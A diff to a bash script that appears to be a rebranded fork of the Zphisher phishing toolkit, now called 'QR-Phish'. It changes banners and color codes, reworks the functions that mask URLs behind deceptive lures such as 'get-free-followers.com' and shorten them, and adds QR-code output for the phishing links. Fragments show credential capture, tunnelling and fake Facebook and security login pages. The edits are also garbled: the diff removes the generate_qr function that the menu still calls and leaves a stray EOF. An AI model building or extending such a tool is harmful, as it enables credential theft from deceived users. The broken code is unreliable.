@@ -5,6 +5,14 @@ __version__="2.3.5"
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
 PORT='8080' 
+# Define color codes
+RED='\033[0;31m'
+WHITE='\033[1;37m'
+ORANGE='\033[0;33m'
+GREEN='\033[0;32m'
+CYAN='\033[0;36m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -113,29 +121,34 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-        ${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${RED} ██████╗ ██████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+		${RED}██╔═══██╗██╔══██╗      ██╔══██╗██║  ██║██║██╔════╝██║  ██║
+		${YELLOW}██║   ██║██████╔╝█████╗██████╔╝███████║██║███████╗███████║
+		${YELLOW}██║▄▄ ██║██╔══██╗╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+		${GREEN}╚██████╔╝██║  ██║      ██║     ██║  ██║██║███████║██║  ██║
+		${GREEN} ╚══▀▀═╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+		${CYAN}                                                         
+		${WHITE}${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by m13hack ${WHITE}
 	EOF
 }
+
+
+
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${RED} ██████╗ ██████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+		${RED}██╔═══██╗██╔══██╗      ██╔══██╗██║  ██║██║██╔════╝██║  ██║
+		${YELLOW}██║   ██║██████╔╝█████╗██████╔╝███████║██║███████╗███████║
+		${YELLOW}██║▄▄ ██║██╔══██╗╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+		${GREEN}╚██████╔╝██║  ██║      ██║     ██║  ██║██║███████║██║  ██║
+		${GREEN} ╚══▀▀═╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+		${CYAN}                                                         
+		${WHITE} ${__version__}
 	EOF
 }
+
 
 ## Dependencies
 dependencies() {
@@ -374,9 +387,7 @@ capture_data() {
 		sleep 0.75
 	done
 }
-		}
-	}
-}
+
 
 ## Start LocalXpose (Again...)
 start_loclx() {
@@ -436,34 +447,33 @@ tunnel_menu() {
 	esac
 }
 
-## Custom Mask URL
+# Custom Mask URL Function
 custom_mask() {
-	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-	echo
-	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
-		fi
-	fi
+    { sleep .5; clear; banner_small; echo; }
+    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+    echo
+    if [[ ${mask_op,,} == "y" ]]; then
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+        read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
+        if [[ ${mask_url//:*} =~ ^(http|https)?$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+            mask=$mask_url
+            echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+        else
+            echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+        fi
+    fi
 }
 
-## URL Shortner
+# URL Shortener Functions
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
 shorten() {
-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	if [[ "$1" == *"shrtco.de"* ]]; then
-		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-	else
-		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
-		processed_url=${short#http*//}
-	fi
+    short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+    if [[ "$1" == *"shrtco.de"* ]]; then
+        processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+    else
+        processed_url=${short#http*//}
+    fi
 }
 
 custom_url() {
@@ -506,23 +516,8 @@ custom_url() {
     echo -e "${GREEN}masked_qr.png"
     echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for Shortened URL :"
     echo -e "${GREEN}shortened_qr.png"
+EOF
 }
-
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
-
-	EOF
-## Generate QR Code
-generate_qr() {
-    local url=$1
-    local qr_file="qr_code.png"
-
-    qrencode -o "$qr_file" "$url"
-
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for Masked URL:"
-    echo -e "${GREEN}$qr_file"
-}
-
 
 site_facebook() {
     cat <<- EOF
@@ -804,7 +799,8 @@ main_menu() {
             msg_exit;;
         *)
             echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-            { sleep 1; main_menu; };;
+            { sleep 1; main_menu; }
+		;;
     esac
 
     generate_qr "$mask" "${website}_qr.png"  # Generate QR code and save to ${website}_qr.png
